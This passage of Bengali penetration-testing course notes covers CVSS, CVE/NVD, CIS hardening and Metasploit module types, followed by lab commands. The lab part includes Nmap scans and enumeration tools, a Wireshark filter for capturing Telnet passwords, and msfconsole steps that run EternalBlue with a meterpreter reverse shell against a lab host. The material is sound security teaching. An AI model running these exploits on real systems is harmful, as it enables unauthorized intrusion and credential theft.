  1. **Base Metric Group:** অন্তর্নিহিত বৈশিষ্ট্য যা সময় বা পরিবেশের সাথে বদলায় না (Attack Vector, Attack Complexity, Privileges Required, Impact on CIA)।
  2. **Temporal Metric Group:** সময়ের সাথে পরিবর্তিত বৈশিষ্ট্য (Exploit Code Maturity, Remediation Level)।
  3. **Environmental Metric Group:** নির্দিষ্ট প্রতিষ্ঠানের লোকাল নেটওয়ার্ক পরিবেশ অনুযায়ী স্কোর।

---

### ৩. CVE & NVD Database ★★
* **CVE (Common Vulnerabilities and Exposures):** বিশ্বব্যাপী প্রতিটি সিকিউরিটি দুর্বলতার জন্য তৈরি একটি ইউনিক পরিচিতি আইডি (যেমন: `CVE-2017-0144` — EternalBlue)। এটি পরিচালনা করে MITRE।
* **NVD (National Vulnerability Database):** মার্কিন সরকারের NIST কর্তৃক পরিচালিত ডাটাবেস যা CVE এন্ট্রির সাথে বিস্তারিত বিশ্লেষণ, CVSS স্কোর, ফিক্স এবং প্যাচের লিঙ্ক সরবরাহ করে।

---

### ৪. What is CIS Benchmark?
* **CIS (Center for Internet Security):** একটি আন্তর্জাতিক অলাভজনক সংস্থা যা আইটি সিস্টেম সুরক্ষার জন্য ইন্ডাস্ট্রি-স্বীকৃত কনফিগারেশন বেসলাইন এবং নির্দেশিকা প্রদান করে।
* **CIS Benchmark:** অপারেটিং সিস্টেম (উইন্ডোজ, লিনাক্স), ক্লাউড বা নেটওয়ার্ক ডিভাইস হার্ডেনিং করার জন্য ধাপে ধাপে নির্দেশিকা (যেমন: পরপর ৫ বার ভুল পাসওয়ার্ড দিলে একাউন্ট লক করা, অডিট লগ সক্রিয় করা, অপ্রয়োজনীয় প্রোটোকল যেমন SMBv1 বা Telnet নিষ্ক্রিয় করা)।

---

# 🚀 Module 8: Penetration Testing Tools

---

### ১. Metasploit Framework: Definition & Module Types ★★★
* **সংজ্ঞা:** Metasploit হলো একটি বহুল ব্যবহৃত ওপেন সোর্স পেনিট্রেশন টেস্টিং ফ্রেমওয়ার্ক, যার মাধ্যমে সিস্টেমের দুর্বলতা যাচাই, এক্সপ্লয়েট কোড রান এবং পেলোড ডেলিভারি করা হয়।
* **মূল মডিউল টাইপসমূহ:**
  1. **Exploit:** কোনো সিস্টেমের দুর্বলতাকে কাজে লাগিয়ে সিস্টেমে প্রবেশের কোড।
  2. **Payload:** এক্সপ্লয়েট সফল হওয়ার পর টার্গেট মেশিনে যে কোডটি রান হয় (যেমন: রিভার্স শেল, মিটারপ্রিটার)।
  3. **Auxiliary:** এক্সপ্লয়েট ছাড়া অন্যান্য কাজের মডিউল— যেমন পোর্ট স্ক্যানিং, স্নিফিং, ভালনারেবিলিটি চেকিং ও এনিউমারেশন।
  4. **Post:** সিস্টেমে ঢোকার পর প্রভিলেজ এস্কেলেশন, তথ্য সংগ্রহ ও লগ ক্লিয়ারিংয়ের মডিউল।
  5. **Encoder:** অ্যান্টিভাইরাস বাইপাস করার জন্য পেলোড কোডকে এনকোড/অবফাসকেট করার মডিউল (যেমন: `shikata_ga_nai`)।
  6. **NOP Generator:** বাফার ওভারফ্লোর জন্য NOP sled তৈরির মডিউল।
* **Meterpreter:** Metasploit-এর একটি অ্যাডভান্সড ডাইনামিক ইন-মেমোরি পেলোড যা কোনো হার্ডড্রাইভে ফাইল না লিখে সরাসরি র্যামে চলে, ফলে অ্যান্টিভাইরাসে ধরা পড়ে না।

---

# 🧪 ল্যাব প্র্যাকটিক্যাল কমান্ড ও অ্যাসাইনমেন্ট গাইড (Slides 2 to 5)

---

### 🌐 Slide 2: Footprinting
* **টুলস:** Maltego, OSINT Framework, GHDB, `nslookup`, `recon-ng`, `sgpt`।
* **অ্যাসাইনমেন্ট:** Footprinting with OSINT and Maltego for `hackersacademy.com`
```bash
# DNS তথ্য সংগ্রহ
nslookup hackersacademy.com
dig hackersacademy.com ANY
dig hackersacademy.com +trace
```

---

### 📡 Slide 3: Scanning & Packet Analysis
* **অ্যাসাইনমেন্ট:** Scanning with Nmap & Wireshark Telnet Server Scanning with TCP.
* **কোর Nmap কমান্ডসমূহ:**
```bash
# ১. হোস্ট ডিসকভারি (Ping sweep ARP ছাড়া)
nmap -sn --disable-arp-ping 10.10.10.0/24

# ২. ওপেন পোর্ট ও সার্ভিস ভার্সন বের করা
nmap -sV -p- -n 10.10.10.3

# ৩. ওএস ডিটেকশন ও অ্যাগ্রেসিভ স্ক্যান
nmap -A -O 10.10.10.3

# ৪. SMB ভালনারেবিলিটি স্ক্রিপ্ট রান করা
nmap -p 445 --script smb-vuln-ms17-010.nse 10.10.10.3

# ৫. নেটওয়ার্কে সক্রিয় ডিভাইস খোঁজা
netdiscover -r 10.10.10.0/24
```
* **Wireshark Telnet Packet Analysis:**
  * ফিল্টার: `tcp.port == 23`
  * রাইট ক্লিক ➔ **Follow ➔ TCP Stream** (Telnet-এ পাঠানো প্লেইনটেক্সট ইউজারনেম ও পাসওয়ার্ড সরাসরি দেখা যায়)।

---

### 🔢 Slide 4: Enumeration & Metasploit Lab
* **অ্যাসাইনমেন্ট:** Nmap, Metasploit for System Enumeration.
* **কমান্ডসমূহ:**
```bash
# ১. Enum4linux দিয়ে উইন্ডোজ/সাম্বা এনিউমারেশন
enum4linux -v -a 10.10.10.3

# ২. SNMP এনিউমারেশন (পাবলিক স্ট্রিং দিয়ে)
snmpwalk -v1 -c public 10.10.10.3

# ৩. DNS জোন ট্রান্সফার টেস্ট
dnsrecon -d hackersacademy.com -t axfr
amass enum -d hackersacademy.com

# ৪. NFS ও RPC এনিউমারেশন
rpcinfo -p 10.10.10.3
showmount -e 10.10.10.3
```

* **Metasploit Console (msfconsole) কমান্ডসমূহ:**
```bash
# কনসোল ওপেন
msfconsole -q

# ১. SMB শেয়ার এনিউমারেশন
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 10.10.10.3
set SMBUser vagrant
set SMBPass vagrant
run

# ২. EternalBlue এক্সপ্লয়েট রান করা
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.3
set RPORT 445
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.x
exploit

# ৩. PsExec এক্সপ্লয়েট
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.10.10.3
set SMBUser vagrant
set SMBPass vagrant
exploit
```

---

### ⚠️ Slide 5: Vulnerability Assessment & Hardening
* **অ্যাসাইনমেন্ট ১:** System Hardening and Configuration according to the CIS Benchmark.
  * *উইন্ডোজ হার্ডেনিং:* `secpol.msc` ➔ **Account Lockout Policy** ➔ *Account lockout threshold = 5 invalid attempts*।
  * অপ্রয়োজনীয় সার্ভিস (Telnet, SMBv1) ডিজাবল করা।
* **অ্যাসাইনমেন্ট ২:** Analyzing CVEs and Scoring Matrix using NVD & CVSS Calculator.
  * NVD ওয়েবসাইট: [nvd.nist.gov/vuln](https://nvd.nist.gov/vuln)
  * FIRST CVSS ক্যালকুলেটর: [www.first.org/cvss/calculator](https://www.first.org/cvss/calculator/v3-1)
  * ক্যালকুলেটরে ভেক্টর ইনপুট দিয়ে Base Score (AV, AC, PR, UI, S, C, I, A) নির্ধারণ করা।
